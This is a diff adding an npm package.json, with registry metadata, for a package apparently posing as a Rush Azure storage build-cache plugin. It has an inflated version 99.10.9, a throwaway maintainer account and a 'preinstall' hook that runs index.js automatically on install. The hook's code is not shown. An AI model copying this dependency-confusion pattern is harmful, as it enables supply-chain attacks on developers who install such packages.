@@ -1,0 +1,39 @@
+{
+    "name": "rush-azure-storage-build-cache-plugin",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "rush-azure-storage-build-cache-plugin@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-m3MpAbwWfJ/vTl6V1i7ipKwHy3+LNwgCcWy+SG7SAIgljV4ENUIB7Q60K35LTm4C3SlM1ZVNXeTaJJA4wNL/nQ==",
+        "shasum": "c2879c45e2ea59bf1469dc5e9de9fa72b5fbce17",
+        "tarball": "https://registry.npmjs.org/rush-azure-storage-build-cache-plugin/-/rush-azure-storage-build-cache-plugin-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5089,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMfwACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoD5Q//Qlr+Fff0SWTGFKIYp7QhPkPoX52Ls9KZdenZdqzH+9CG+4nv\r\niWxIFwuxTHCAAMnqRNmnoskEMCAiCYXCSMIj8ncvtiAV7lTGK8Srp1GgkE4q\r\nM6TL3sBfOWo4aZPRyhLn/Ld2fCfUEAWzTCkLZiJXlHmvpaQZKZ94WMWRkUyd\r\nDAQjDdP9DcwurRoUJipurbZOHgVsbWjbAssJtqSWGbFFLu621aP1SLNT42xp\r\nGPis3auMScTgPBpTfnyCm1lcGfHh4LP1DHhsMmO4j4sTGevzq6z6es2aFwmX\r\n6/B9B03XRseFOfuV+tFO8IS7A5UYt6nImdV356ne3EMJc9cdQLtyrat6Y10q\r\nDL1kFrYtmFEoBdm80IQIA2WqlG1nAkt8vKQRoZ8SXMUPEX/8w/fi/iMcvrTU\r\num5O6aWRZ76AsCCGt6oWtutVfPARRM+a/FzKlsphXrY3JiQbFfC3XzmoI6d9\r\nnU/0O6+VN6UvOI+/ke/KdJ+wk0g0vV6Xc83LRGCv7thfbaLCO9ha2ONwE/nC\r\nK/SbRfx0ltreN7ibjBjaOWH2nUUxt53S+r3deD0vWjE1APTmZrdRk/iuFTTg\r\nJ3rE0V7zrgsgOOvxmFCinVIMVyKfowWdUnH7Zonde1m8UlSl8YZUMFCN9Zr2\r\n94E7iOmi/hqL3liHApF3yoR7JKrvPDZJBqw=\r\n=1rK4\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "5qukryl8",
+        "email": "5qukryl8@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "5qukryl8",
+            "email": "5qukryl8@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/rush-azure-storage-build-cache-plugin_99.10.9_1648150512557_0.7767774295486773"
+    },
+    "_hasShrinkwrap": false
+}
